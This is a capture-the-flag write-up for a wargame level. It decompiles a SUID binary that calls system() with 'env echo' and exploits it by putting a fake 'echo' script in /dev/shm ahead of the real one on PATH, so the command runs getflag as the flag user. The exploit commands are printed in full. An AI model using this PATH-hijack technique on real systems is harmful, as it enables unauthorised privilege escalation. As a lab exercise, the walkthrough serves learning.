# foothold

Easy one, we have a binary with SUID perms on the user home, yummy yummy.

Notice the `s` where the `x` normally is:
```raw
-rwsr-sr-x 1 flag03   level03 8627 Mar  5  2016 level03*
```

# exploit

Okey, no more games, let's reverse it with the good old and free ghidra, and see
what it does.

Okey, I had to download ghidra and the Java 17 JDK, zzz.

Decompile it and... its a call to `system()` in the `main()` function... with
the following command:
```c
int main(int argc,char **argv,char **envp)
{
    __gid_t __rgid;
    __uid_t __ruid;
    int iVar1;
    gid_t gid;
    uid_t uid;

    __rgid = getegid();
    __ruid = geteuid();
    setresgid(__rgid,__rgid,__rgid);
    setresuid(__ruid,__ruid,__ruid);
    iVar1 = system("/usr/bin/env echo Exploit me");
    return iVar1;
}
```

As we see, the binary gets the Effective UID and Effective GID, and calls
`setresuid` with it, so that way the Real UID, Effective UID and Saved Set UID.

Cool, the system command will execute as if it where the Effective UID, and
since the executable has the SUID flag... that means we are running that
`system()` call as `flag03`.

And since it is searching for the command `echo` in the enviroment...
So we can do something like this...
```
export PATH=/dev/shm:$PATH
echo -ne '#!'"/bin/bash\ngetflag\n" > /dev/shm/echo
chmod +x /dev/shm/echo
```

And... there it is, yummy yummy flag.
